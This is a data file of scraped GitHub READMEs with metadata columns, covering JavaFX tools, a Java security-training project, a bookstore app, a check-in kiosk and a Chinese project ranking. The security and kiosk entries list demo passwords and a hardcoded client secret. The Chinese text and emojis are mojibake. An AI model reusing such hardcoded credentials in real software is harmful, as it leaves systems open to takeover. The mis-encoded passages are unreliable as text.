",0,0,7,Apache-2.0,0,18.0,0.0,0.0,0.0,0.0,0.0,1.0,153.0
jtaccuino/jtaccuino,main,"# JTaccuino

JTaccuino is a JavaFX based notebook application for Java developers.

It is built for usages in education, interactive experimation with algorithms and possible more advanced use cases.

Java code execution is provided by JShell, the awesome Java REPL.

## Licenses and used 3rd party software / components

### Libraries

#### Flexmark
License: BSD-2-Clause license

flexmark-java is a Java implementation of CommonMark (spec 0.28) parser using the blocks first, inlines after Markdown parsing architecture.

#### GluonHQ RichTextArea
License: GPL-3.0 license

Gluon presents a new JavaFX control, created with Java and JavaFX standard APIs, called the RichTextArea control. RichTextArea is a text input control which provides rich text features along with emoji, and non-text objects like images, tables and hyperlinks.

#### GemsFX
License: Apache-2.0 license

GemsFX is a collection of custom controls and utilities for JavaFX.

#### OpenJFX
License: GPL-2.0 with Classpath Exception

OpenJFX is an open source, next generation client application platform for desktop, mobile and embedded systems based on JavaSE. It is a collaborative effort by many individuals and companies with the goal of producing a modern, efficient, and fully featured toolkit for developing rich client applications. This is the open source project where we develop JavaFX.

#### Yasson
License: Eclipse Public License - v 2.0

Yasson is a Java framework which provides a standard binding layer between Java classes and JSON documents. This is similar to what JAXB is doing in the XML world. Yasson is an official reference implementation of JSON Binding.

#### Jakarta JSONB
License: Eclipse Public License - v 2.0

Jakarta JSON Binding

#### Maven Resolver
License: Apache-2.0 license

Apache Maven Artifact Resolver is a library for working with artifact repositories and dependency resolution.

### Resources

#### Fonts
The application uses [Monaspace](https://github.com/githubnext/monaspace) fonts provided by GitHub Next especially
- Monaspace Argon
- Monaspace Radon

both licensed under [SIL OPEN FONT LICENSE Version 1.1](http://scripts.sil.org/OFL)

#### Icons
Icons used are downloaded from [SVGRepo](https://www.svgrepo.com/) and converted to SVG paths useable in JavaFX by the [SVG Path Extractor at JFXCentral](https://www.jfx-central.com/utilities/pathextractor).

Icons used are from the following collections
- Meteor Line Interface Icons
  - License: [MIT License](https://www.svgrepo.com/page/licensing/#MIT)
  - Author: ShopWare
- Zest Interface Icons
  - License: [MIT License](https://www.svgrepo.com/page/licensing/#MIT)
  - Author: zest
-  Flat Icon Design Dark Vectors
  - License: [PD License](https://www.svgrepo.com/page/licensing/#PD)
  - Author: flat-icon-design
",1,4,1,Apache-2.0,2,23.0,1.0,3.0,4.0,20.0,1.0,-5.85,0.0
Hirun4/music-app,main,"## Getting Started

Welcome to the VS Code Java world. Here is a guideline to help you get started to write Java code in Visual Studio Code.

## Folder Structure

The workspace contains two folders by default, where:

- `src`: the folder to maintain sources
- `lib`: the folder to maintain dependencies

Meanwhile, the compiled output files will be generated in the `bin` folder by default.

> If you want to customize the folder structure, open `.vscode/settings.json` and update the related settings there.

## Dependency Management

The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
",0,3,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Arfifias/Equees_men,main,"# Equees_men
After watching Xmen 97 season one and bumping into the spanish version of the intro of the Xmen 1992 made me wanna create a Xmen parody. So I made a GUI with flip effect on left mouse click and an infite soundtrack loop of the spanish version of the intro. The result from all of this was Eques men 
",0,0,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
ionutbalosin/java-application-security-practices,main,"<p align=""center"">
  <img alt=""eCommerce"" title=""eCommerce"" src=""assets/images/hedgehog_logo_200.png"">
</p>

<h1 align=""center"">Java Application Security Practices</h1>
<h4 align=""center"">‚ö°Ô∏è Secure by Design: Empowering Java Developers with Best Practices. ‚ö°Ô∏è</h4>

---

This repository provides practical examples and code snippets aimed at helping Java developers implement security best practices. It covers key topics such as security design principles, authentication and authorization, API security, Java process security, common attack mitigations, and security testing - all essential for building secure Java applications.

These examples are designed to complement the curriculum of the üìö [Application Security for Java Developers](https://ionutbalosin.com/training/application-security-for-java-developers-course) Course. 

If you're looking to take your skills to the next level, üéì [enroll now](https://ionutbalosin.com/training/application-security-for-java-developers-course) and master the art of secure coding in Java!

For more resources and insights, feel free to visit my [website](https://ionutbalosin.com).

---

## Content

- [Security Concepts](#security-concepts)
- [Project Modules](#project-modules)
- [Architectural Diagrams](#architectural-diagrams)
  - [Software Architecture Diagram](#software-architecture-diagram)
  - [Sequence Diagram](#sequence-diagram) 
- [Technology Stack](#technology-stack)
- [SetUp](#setup)
- [Security Checks](#security-checks)
  - [OWASP Dependency-Check](#owasp-dependency-check)
  - [SpotBugs with FindSecBugs Plugin](#spotbugs-with-findsecbugs-plugin)
  - [Zed Attack Proxy (ZAP)](#zed-attack-proxy-zap)
- [License](#license)

## Security Concepts

Among the **security concepts** demonstrated in this project:

- Security Design Principles
  - Least privilege
  - Defense in depth
  - Fail securely
  - Compartmentalization
- OAuth 2.0 Grant Types:
  - Password Flow
  - Client Credentials Flow
  - Authorization Code Flow
  - Authorization Code Flow with Proof Key for Code Exchange (PKCE)
- API and Microservices Security
  - Token introspection
  - JSON Web Key Set (JWKS)
  - Roles-based access control
- Java Process Security
  - Input data validation and sanitization
  - Handling input files from external sources
  - Security logging best practices
  - Content Security Policy (CSP)
  - Cross-Origin Resource Sharing (CORS)
  - HTTP security headers (e.g., Strict-Transport-Security, X-XSS-Protection, X-Frame-Options)
  - Java deserialization
- Security Testing
  - Software Composition Analysis (SCA)
  - Static Application Security Testing (SAST)
  - Dynamic Application Security Testing (DAST)

## Project Modules

Below is a breakdown and description of each module in the current project.

Module                                                  | Description                                                                                                                                                                                                                                                                                                                                   |
------------------------------------------------------- |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
`pizza-order-*`, `pizza-cooking-*`, `pizza-delivery-*`  | These modules represent 3 microservices and their APIs (Pizza Cooking, Delivery, and Order) that demonstrate various OAuth 2.0 flows (e.g., token introspection, JWKS, client credentials), roles-based access control and security logging concepts.                                                                                         |
`security-feign-logger-enricher`                        | Enriches and enables standard Feign client logging with additional custom Mapped Diagnostic Context (MDC) attributes (e.g., correlation ID) using SLF4J's MDC.                                                                                                                                                                                |
`security-slf4j-logger-enricher`                        | Enriches SLF4J-based logging with security-specific attributes (e.g., remote host, remote port, user agent, request URI, request method, correlation ID) using SLF4J's MDC.                                                                                                                                                                   |
`security-token-client-credentials-fetcher`             | Fetches tokens from the Identity Provider (IdP) using the client credentials flow.                                                                                                                                                                                                                                                            |
`security-token-introspection`                          | Introspects and validates access tokens using the IdP's token introspection endpoint. Additionally, it disables security for specific `/public` endpoints (e.g., OpenAPI definition endpoint), configures CORS and Content Security Policy (CSP), adds HTTP security headers, and parses JWT claim roles, adding them as granted authorities. |
`security-token-jwks`                                   | Handles JSON Web Key Set (JWKS) validation and signature verification of JWT tokens using the IdP's JWKS endpoint. Additionally, it disables security for specific `/public` endpoints (e.g., OpenAPI definition endpoint) and parses JWT claim roles, adding them as granted authorities.                                                    |
`serialization-deserialization`                         | Demonstrates security risks in serialization and deserialization, including exploits like Java class deserialization attacks, XML external entities, YAML bombs, and ZIP bombs.                                                                                                                                                               |

## Architectural Diagrams

### Software Architecture Diagram

This software architecture diagram illustrates the microservices as components within the system and highlights key security aspects, including OAuth 2.0 flows (e.g., Token introspection, JWKS) and endpoint roles checks.

<img src=""assets/diagrams/software-architecture-diagram.svg"">

### Sequence Diagram

```mermaid
sequenceDiagram
actor User
User->>IdP: Authenticate and fetch JWT (authorization code flow)
User->>Pizza Order Service: Submit order with JWT as HTTP Bearer token
Pizza Order Service->>IdP: Introspect JWT to verify validity
Pizza Order Service->>Pizza Order Service: Check user roles/permissions
Pizza Order Service->>Pizza Cooking Service: Submit cooking order with JWT as HTTP Bearer token
Pizza Cooking Service->>IdP: Fetch JWKS keys (if missing or expired) for local JWT validation
Pizza Cooking Service->>Pizza Cooking Service: Validate JWT signature using JWKS
Pizza Cooking Service->>Pizza Cooking Service: Check user roles/permissions

Note right of Pizza Cooking Service: Pizza is cooked ...

Pizza Cooking Service->>IdP: Fetch JWT (client credentials flow)
Pizza Cooking Service->>Pizza Delivery Service: Submit delivery order with JWT as HTTP Bearer token
Pizza Delivery Service->>IdP: Fetch JWKS keys (if missing or expired) for local JWT validation
Pizza Delivery Service->>Pizza Delivery Service: Validate JWT signature using JWKS
Pizza Delivery Service->>Pizza Delivery Service: Check user roles/permissions
Pizza Delivery Service->>Pizza Delivery Service: Confirm order delivered
Pizza Delivery Service->>Pizza Order Service: Send order status update
Pizza Order Service->>IdP: Introspect JWT to verify validity
Pizza Order Service->>Pizza Order Service: Check user roles/permissions
Pizza Order Service->>Pizza Order Service: Update order status
```

## Technology Stack

This project includes the following **technologies, frameworks, and libraries**:

- [Spring Boot](https://spring.io/projects/spring-boot)
- [Spotless](https://github.com/diffplug/spotless) as a code formatter
- [Docker compose](https://docs.docker.com/compose/)
- [Keycloak](https://www.keycloak.org/) as an Identity and Access Management solution
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check) as a Software Composition Analysis (SCA) tool
- [Spotbugs](https://spotbugs.github.io/) with [FindSecBugs plugin](https://find-sec-bugs.github.io/) as a Static Application Security Testing (SAST) tool
- [The Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy) as a Dynamic Application Security Testing (DAST) tool
- [OWASP WebGoat](https://owasp.org/www-project-webgoat) a deliberately insecure application

## SetUp

### Tools to Download and Install

Please ensure you have properly downloaded, installed, and configured the following tools:

Tool                         | Link                                                                                              |
---------------------------- |---------------------------------------------------------------------------------------------------|
JDK 21                       | [Download](https://projects.eclipse.org/projects/adoptium.temurin/downloads) _(i.e., latest LTS)_ |
Docker                       | [Download](https://docs.docker.com/engine/install/)                                               |
Postman                      | [Download](https://www.postman.com/)                                                              |
`curl` command line          | [Download](https://everything.curl.dev/install/index.html)                                        |
`jq` command line            | [Download](https://jqlang.github.io/jq/download/)                                                 |


The course is developed to work best on **GNU/Linux**. However, if you prefer to use a **Windows** machine, you can use one of the following alternatives to properly execute the bash scripts: 
- [GIT bash](https://git-scm.com/downloads)
- [Cygwin](https://www.cygwin.com/)
- Windows Subsystem for Linux (WSL)
 
### Compile, Run Tests, and Package

To compile the project, run tests, and package it, use the following command:

```bash
./mvnw clean package
```

### Bootstrap Services with Docker

**Note:** Please ensure that the Docker daemon is running; otherwise, the commands will not execute successfully.

1. Run the following command to start the `Keycloak` service in Docker:

    ```bash
    ./bootstrap-keycloak.sh
    ```

2. To start the `Pizza` application, which includes multiple microservices running in Docker, execute:
   
    ```bash
    ./bootstrap-pizza-application.sh
    ```

3. Next, run the following command to start the `OWASP WebGoat` application in Docker:
   
    ```bash
    ./bootstrap-webgoat.sh
    ```

4. Finally, check that all Docker containers are up and running by executing:

    ```bash
    docker ps -a
    ```

### Keycloak Configuration

To set up a basic Keycloak configuration, run the following script:

```bash
./keycloak-init.sh
```

The script creates OAuth 2.0 clients, users, and roles under the `master` realm and assigns the roles to the users:

 Type         | Name                  | Password                           | Purpose                                     |
--------------|-----------------------|------------------------------------|---------------------------------------------|
 User         | `demo_user`           | `Test1234!`                        | Used for authorization code flow with PKCE. |
 Client ID    | `demo_public_client`  | `6EuUNXQzFmxu6xwPHDvvoh56z1uzrBMw` | Used for authorization code flow.           |
 Client ID    | `demo_private_client` | `6EuUNXQzFmxu6xwPHDvvoh56z1uzrBMw` | Used for client credentials flow.           |

This setup utilizes [Keycloak's REST API](https://www.keycloak.org/docs-api/latest/rest-api/index.html) to perform these operations and provides output at each step, ensuring efficient user and client management within the Keycloak environment.

### Services Overview via UI

Open a browser and navigate to http://localhost:9090 to access the **Keycloak UI** (using the credentials `admin:admin`).

Open a browser and navigate to http://localhost:9090/realms/master/.well-known/openid-configuration to access the **Keycloak OpenID Connect configuration**.

Open a browser and navigate to http://localhost:18080/public/swagger-ui/index.html to access the **Pizza Order OpenAPI definition**.

Open a browser and navigate to http://localhost:28080/public/swagger-ui/index.html to access the **Pizza Cooking OpenAPI definition**.

Open a browser and navigate to http://localhost:38080/public/swagger-ui/index.html to access the **Pizza Delivery OpenAPI definition**.

Open a browser and navigate to http://localhost:48080/WebGoat/login to access the **OWASP WebGoat UI**.

### Local Tests with Postman

1. Open `Postman` and import the [Postman collections](postman).
2. To simulate a basic test scenario, follow these steps in the given sequence:
  - a) Fetch the JWT token using either:
    - The **Password Flow**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/token
       ```
    - Or the **Client Credentials Flow**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/token
       ```      
    - Or the **Authorization Code Flow with PKCE**:
       ```
       POST http://localhost:9090/realms/master/protocol/openid-connect/auth
       ```   
  - b) Initiate an order request to the `pizza-order-service`:
       ```
       POST http://localhost:18080/pizza/orders
       ```

## Security Checks

### OWASP Dependency-Check

[OWASP Dependency-Check](https://owasp.org/www-project-dependency-check) is an open-source **Software Composition Analysis (SCA)** tool that identifies vulnerabilities in project dependencies, helping reveal and address known security risks.

To check for potential dependency vulnerabilities, execute the following command:

```bash
./mvnw clean compile org.owasp:dependency-check-maven:check
```

**Note:** The first run of this command might take a significant amount of time (e.g., from a couple of minutes to even tens of minutes, depending on the internet connection) to initially download the [NVD Data Feeds](https://nvd.nist.gov/vuln/data-feeds) hosted by NIST. 

### SpotBugs with FindSecBugs Plugin

[Spotbugs](https://spotbugs.github.io/) is an open-source static analysis tool that detects bugs in Java programs by analyzing bytecode.

With the help of the [FindSecBugs plugin](https://find-sec-bugs.github.io/) plugin, it can be used as a **Static Application Security Testing (SAST)** tool to identify security vulnerabilities in Java applications.

To check for potential code vulnerabilities, execute the following command:

```bash
./mvnw clean compile spotbugs:check
```

### Zed Attack Proxy (ZAP)

[The Zed Attack Proxy (ZAP)](https://github.com/zaproxy/zaproxy) is an open-source **Dynamic Application Security Testing (DAST)** tool specifically designed for identifying vulnerabilities in applications during runtime.

To check for API security vulnerabilities, execute the following command:

```bash
./zap-scan.sh
```

The command starts ZAP in Docker, launches an API scan using the [zap-api-scan rules](zap/zap-api-scan-rules.conf) against one of the services, and saves the scan report in the [./zap/reports](zap/reports) folder.

## License

This project is licensed under the Apache License, Version 2.0.

Please see the [LICENSE](license/LICENSE) file for full license.

```
/*
 * Application Security for Java Developers
 *
 * Copyright (C) 2024 Ionut Balosin
 * Website: www.ionutbalosin.com
 * X: @ionutbalosin | LinkedIn: ionutbalosin | Mastodon: ionutbalosin@mastodon.social
 *
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * ""License""); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
```",0,0,2,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
mkpaz/devtoolsfx,master,"# devtoolsfx

DevToolsFX is a tool for navigating your application's scene graph and exploring node properties. It aims to be similar
to Chrome DevTools, but for JavaFX.

It's lightweight, around 250 KB, with no dependencies, allowing you to easily embed it into your app. The only JavaFX
dependency is `javafx.controls`, which your app will need regardless.

<p align=""center"">
<img src=""https://raw.githubusercontent.com/mkpaz/devtoolsfx/master/.screenshots/inspector.png"" alt=""inspector""/>
</p>

Find more screenshots [here](https://github.com/mkpaz/devtoolsfx/tree/master/.screenshots).

## Getting started

Maven:

```xml

<dependency>
    <groupId>io.github.mkpaz</groupId>
    <artifactId>devtoolsfx-gui</artifactId>
    <version>TBD</version>
</dependency>
```

Gradle:

```groovy
dependencies {
    implementation 'io.github.mkpaz:devtoolsfx-gui:TBD'
}
```

After the primary stage is shown, you can launch the dev tools GUI at any time with:

```java
primaryStage.setOnShown(
    e -> GUI.openToolStage(primaryStage, getHostServices())
);
```

Check the `devtoolsfx.gui.GUI` class for additional ways to launch the dev tools, such as embedding it at the top or
bottom. Also, refer to the demo for a more detailed example.
",0,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
DVSR1411/onlinebookstore,master,"# üìö OnlineBookStore üìö 
## Description 
**OnlineBookStore** is a web application built using Java Servlets. It allows users to browse, search, and purchase books online. The backend is powered by MySQL, and the application is containerized using Docker for easy deployment and scalability. 
## Features ‚ú® 
- üîí User registration and login
- üìñ Browse and search for books
- üõí Add books to cart and checkout
- üìú Order history and management 
- ‚öôÔ∏è Admin panel for managing books and orders
## Technologies Used üõ†Ô∏è 
- **Java Servlets**
- **MySQL**
- **Docker**
- **HTML/CSS/JavaScript**
## Installation‚öôÔ∏è
### Prerequisitesüìã
- Docker installed on your machine
- Java Development Kit (JDK) installed
### StepsüöÄ
1. **Clone the repository:**
   ```sh
   git clone https://github.com/yourusername/onlinebookstore.git
   cd onlinebookstore
2. **Build the Docker images:**
    ```sh
    docker-compose build
3. **Start the containers:**
    ```sh
    docker-compose up
4. Access the application: Open your web browser and navigate to http://localhost:8080.
## Contactüì¨:
- For any questions or support, please contact Sathwik at d.v.sathwikreddy@gmail.com.
- Feel free to adjust any specifics to better fit your project!
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Blueblue1101/SmartFlightCheckInKiosk,main,"# Readme

## 0.Introduction
***We do recommend you to read the README file in markdown [here](README.md).***

The aim of this project is to develop a smart kiosks in front of its check-in desks at the Airport. To develop this system, we first have meetings to brainstorm for specific requirements. Then we use some fact-finding techniques such as interviews, observation, questionnaire and so on to make the requirements clear and accurate enough. Then we write java code through iterative development. At the end, we improve the user interface and produce some documents like user manuals. We hope every user of this software and our customer can be satisfied with this software.

### 0.1 Environment

| OS      | maven | junit | javafx | controlsfx | formsfx-core | validatorfx | ikonli-javafx | bootstrapfx-core | tilesfx | maven-compiler-plugin |  jdk| javafx-maven-plugin |configuration |
| ------- | ----- | ----- | ------ | ---------- | ------------ | ----------- | ------------- | ---------------- | ------- | --------------------- | ------------- | ------------------- |------------------- |
| Win_x64 | 4.0.0 | 5.8.1 | 15.0.1 | 11.1.0     | 11.3.2       | 0.1.13      | 12.2.0        | 0.4.0            | 11.48   | 3.8.1                 | 18.0.1            | 0.0.8               |15 |



## 1. Open

There are three ways to operate the program

#### 1.1 Open with source code

To open the system, open the folder with from your IDE and find the java file 'src/main/java/group16/smartflightcheckinkiosk/APP.java' and run it.

![img.png](ReadmeImg/APPshoot.png)


#### 1.2 Open with executable file 
<span style=""color:red"">You could get the executable file in our [release]() in Github, which will help you enjoy the software without any commanline input. </span>

#### 1.2.1 Open with .exe file

you can doubleclick the ""SmartFlightCheckInKiosk.exe"" to operate it

or use ""cmd"" and enter the directory, then run ""start SmartFlightCheckInKiosk.exe"" .

#### 1.2.2 Open with .jar file

you can doubleclick the ""SmartFlightCheckInKiosk.jar"" to operate it

or use ""cmd"" and enter the directory, then run ""Java -jar SmartFlightCheckInKiosk.jar"". While you have to make sure your jdk version is openjdk18.0.1.

![1653916681802](ReadmeImg/run.png)

## 2. Passenger Log In

![img.png](ReadmeImg/cl.png)

Click passenger and then enter the passenger's login page. On this page, you can choose three ways to check-in

![img.png](ReadmeImg/login.png))


### 2.1 Log in

The first method is to click the first button"" Booking Number"" and you can enter the check-in of different people through the book number in the following table:

![img.png](ReadmeImg/login-1.png)

| 123456 | JACK |
| ------ | ---- |
| 123457 | ROSE |
| 123458 | TOM  |
| 123459 | MIKE |

![img.png](ReadmeImg/login-2.png)

The second method is to click the second button ""Surname&ID number"" and enter the surname and id number. You can enter the check-in of different people through the surname and ID number in the following table:

| ID number | Surname |
| --------- | ------- |
| 01        | JACK    |
| 02        | ROSE    |
| 03        | TOM     |
| 04        | MIKE    |

![img.png](ReadmeImg/idcidc.png)

The third method is to click the third button and scan the id-card. We use the ""login.csv"" in the project as the id-card information entered by the passenger, so you can click ok to directly enter the subsequent interface, and click ""back ""at the bottom You can go back to the previous ChooseLogin interface.



### 2.2 Extra Options 

After logging in,  there is the main menu page, where you can see the booking information. The subsequent operations can be performed in the upper menu bar. 

![img.png](ReadmeImg/mainmenu.png)

First, you can directly return to the ""ChooseLogin"" page from Login-Quit. The second tab is ""Choose"" where passengers can choose meals and seats at Meal and Seat. The selected item button will turn blue.

![img.png](ReadmeImg/xhs1.png)

![img.png](ReadmeImg/zw.png)

The selected meal and seat and the amount to be paid can be seen in the third tab ""Budget"", enter the credit card number, click ""ok"" to pay, if the number is wrong, it will display ""sorry, your car number is not correct"" , if the balance is insufficient, it will display ""sorry, your balance is not enough"", if the payment is successful, it will display ""successfully paid!O(‚à©_‚à©)O"", and the text on the ""ok"" button will be grayed out and cannot be clicked.

![img.png](ReadmeImg/bgbgbg.png)

 The table below shows passengers and their account numbers and balances

| Surname | Credit number | balance |
| ------- | ------------- | ------- |
| JACK    | 666           | 100.0   |
| ROSE    | 777           | 225.0   |
| TOM     | 888           | 200.0   |
| MIKE    | 999           | 100.0   |

_(If you want to test this function, you can enter the wrong number by entering the wrong number, or enter the correct number but select meals and seats that are out of balance)_

### 2.3 Boarding pass

The fourth tab is the last step of the passenger check-in boarding pass. First enter the interface called boardingpass-check, which will display the boarding information including the passenger's selected seat and meal information.

![img.png](ReadmeImg/bcbcbc.png)

Note that you can click Next and print out the ticket and other information normally only after you have successfully paid the extra cost and selected your seat successfully.

 *If you want to test this error checking function:*

* *The situations where you cannot proceed to the next step includes: 1. Entering this interface without selecting a seat 2. When there are additional expenses that have not been paid*
* T*he situations where you can proceed to the next step includes: 1. When choosing a free seat such as A4 without ordering or paying for food 2. After successful payment of all additional expenses*

The second page is a notification page, notificating passengers that three items would be printed out:the boarding pass, the ticket corresponding to each check-in baggage, and the tag corresponding to each carry-on baggage

![img.png](ReadmeImg/boardingpass-final.png)

Click ""ok"" to print out the above items. There is a boardingpass window, each carry-on baggage corresponds to a boardingpass-tag window (with the tag name starting with CO), and each check baggage corresponds to a boarding-ticket window (with counter and tag name starting with CI) 

The following table shows the "" owner, tag name, counter number, category"" of each luggage

| owner | tag  | counter | type(1.check-in 2.carry-on) |
| ----- | ---- | ------- | --------------------------- |
| JACK  | CI1  | 01      | 1                           |
| JACK  | CI2  | 01      | 1                           |
| JACK  | CI3  | 02      | 1                           |
| JACK  | CO1  |         | 2                           |
| JACK  | CO2  |         | 2                           |
| JACK  | CO3  |         | 2                           |
| JACK  | CO4  |         | 2                           |
| ROSE  | CI4  | 01      | 1                           |
| ROSE  | CI5  | 01      | 1                           |
| TOM   | CI6  | 01      | 1                           |
| TOM   | CO5  |         | 2                           |



## 3. Staff

Click ""Back"" buttons until go back to the ChooseLogin page. Then click on ""Staff"" button to enter the first window of the staff system (Staff Login window).

The Staff system including StaffLogin, EnterFlight, CheckFlight and FlightList window.

This module allows staff to enter back-end system and inquire the information and check-in status of all passengers who have booked this flight. 

### 3.1 Staff login

After entering the staff login window, you can put in your staff ID and password to access the Back-end system.

<img src=""ReadmeImg/stafflogin.png"" alt=""tag"" style=""zoom:50%;"" />

You can use the following account to log in:

| Staff ID | Password |
| -------- | -------- |
| 123      | 456      |



### 3.2 Check flight information

After entering the back-end system, enter the flight number you want to query.

<img src=""ReadmeImg/enterflight.png"" alt=""tag"" style=""zoom:50%;"" />

You can check the following flights:

| Flight number |
| ------------- |
| CA1343        |
| EC3434        |



### 3.3 Confirm your inquiry

To prevent similar flights from being queried due to incorrect input, please confirm the flight you want to query through the flight details.

<img src=""ReadmeImg/checkflight.png"" alt=""tag"" style=""zoom:50%;"" />

### 3.4 Passenger list

After confirming the flight, check the passenger information and check-in status in the back-end  system. In order to check the overall check-in status, the kiosk will put the number of unchecked passengers in this flight at the bottom.

<img src=""ReadmeImg/flightlist.png"" alt=""tag"" style=""zoom:50%;"" />
",0,0,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,17.0
ChHsiching/GitHub-Chinese-Top-Charts,main,"![GitHub‰∏≠ÊñáÊéíË°åÊ¶ú](https://i.v2ex.co/wF4Dx0vO.png)

#### Ê¶úÂçïËÆæÁ´ãÁõÆÁöÑ

- :cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆÔºõ
- ÂêÑ‰ΩçÂºÄÂèëËÄÖ‰ºô‰º¥ÂèØ‰ª•Êõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™å„ÄÅÊàêÊûúÔºõ
- ‰∏≠ÊñáÈ°πÁõÆÂè™ËÉΩÊª°Ë∂≥Èò∂ÊÆµÊÄßÁöÑÈúÄÊ±ÇÔºåÊÉ≥Ë¶ÅÊúâËøõ‰∏ÄÊ≠•ÊèêÂçáÔºåËøòËØ∑Â§öËä±Êó∂Èó¥Â≠¶‰π†È´òÂàÜÁ•ûÁ∫ßËã±ÊñáÈ°πÁõÆÔºõ

#### Ê¶úÂçïËÆæÁ´ãËåÉÂõ¥

- ËÆæÁ´ã1‰∏™ÊÄªÊ¶úÔºàÊâÄÊúâËØ≠Ë®ÄÈ°πÁõÆÊ±áÊÄªÊéíÂêçÔºâ„ÄÅ18‰∏™ÂàÜÊ¶úÔºàÂçï‰∏™ËØ≠Ë®ÄÈ°πÁõÆÊéíÂêçÔºâÔºõ

#### Ê¶úÂçïÂÖ•ÈÄâËßÑÂàô

- ‰∏Ä‰∏™Â∞èÂ∞èÁöÑË¶ÅÊ±ÇÔºöÈ°πÁõÆÁöÑ Description Âíå README.md ÈÉΩË¶ÅÂåÖÂê´‰∏≠ÊñáËØ¥ÊòéÔºõ
- Êõ¥Êñ∞Ë∂äÊåÅÁª≠Ë∂äÂ•ΩÔºöÊúÄËøëÂçäÂπ¥ÂÜÖÊúâÊõ¥Êñ∞ËøáÁöÑÈ°πÁõÆÊâçÊúâÊú∫‰ºöÂÖ•ÈÄâÔºàÊã•Êä±Ê¥ªË∑ÉÔºåËøúÁ¶ªÂÉµÂ∞∏ÔºâÔºõ
- Stars Ë∂äÂ§öË∂äÂ•ΩÔºöÂú®Êª°Ë∂≥ÊåÅÁª≠Êõ¥Êñ∞ÁöÑÂâçÊèêÊù°‰ª∂‰∏ãÔºåÂêÑÊ¶úÊ†πÊçÆ Stars ÂØπÈ°πÁõÆËøõË°åÊéíÂ∫èÔºõ

#### Ê¶úÂçïÊõ¥Êñ∞È¢ëÁéá

- ÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊúÄËøëÊõ¥Êñ∞Êó∂Èó¥‰∏∫10Êúà30Êó•Ôºõ

#### License

- Êú¨‰ªìÂ∫ìÂÜÖÂÆπÁöÑÂÆö‰πâ„ÄÅÂàõÂª∫„ÄÅÊõ¥Êñ∞Áª¥Êä§ÂùáÁî±Êú¨‰∫∫ÂèëËµ∑‰∏éÊé®ËøõÔºåÂú®ÊÇ®ÂºïÁî®Êú¨‰ªìÂ∫ìÂÜÖÂÆπ„ÄÅËΩ¨ËΩΩÊñáÁ´†Êó∂ÔºåËØ∑Âú®ÂºÄÂ§¥ÊòéÊòæÂ§ÑÊ†áÊòé‰ΩúËÄÖÂèäÈ°µÈù¢Âú∞ÂùÄÔºåË∞¢Ë∞¢Ôºõ

<br/>

## ÁõÆÂΩï

- ÊÄªÊ¶ú
  - [All Language](#All-Language)

- ÂàÜÊ¶ú
  - [Java](#Java)
  - [Python](#Python)
  - [Go](#Go)
  - [PHP](#PHP)
  - [JavaScript](#JavaScript)
  - [Vue](#Vue)
  - [CSS](#CSS)
  - [HTML](#HTML)
  - [Objective-C](#Objective-C)
  - [Swift](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Swift)
  - [Jupyter Notebook](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Jupyter-Notebook)
  - [Shell](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Shell)
  - [C](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C)
  - [C++](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C-1)
  - [C#](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#C-2)
  - [Dart](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Dart)
  - [TeX](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#TeX)
  - [Vim script](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts/blob/master/README-Part2.md#Vim-script)

<br/>


## All Language

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[CyC2018/CS-Notes](https://github.com/CyC2018/CS-Notes)|:books: ÊäÄÊúØÈù¢ËØïÂøÖÂ§áÂü∫Á°ÄÁü•ËØÜ„ÄÅLeetcode„ÄÅËÆ°ÁÆóÊú∫Êìç‰ΩúÁ≥ªÁªü„ÄÅËÆ°ÁÆóÊú∫ÁΩëÁªú„ÄÅÁ≥ªÁªüËÆæËÆ°„ÄÅJava„ÄÅPython„ÄÅC++|113.6k|Java|10/29|
|2|[jackfrued/Python-100-Days](https://github.com/jackfrued/Python-100-Days)|Python - 100Â§©‰ªéÊñ∞ÊâãÂà∞Â§ßÂ∏à|94.7k|Python|10/22|
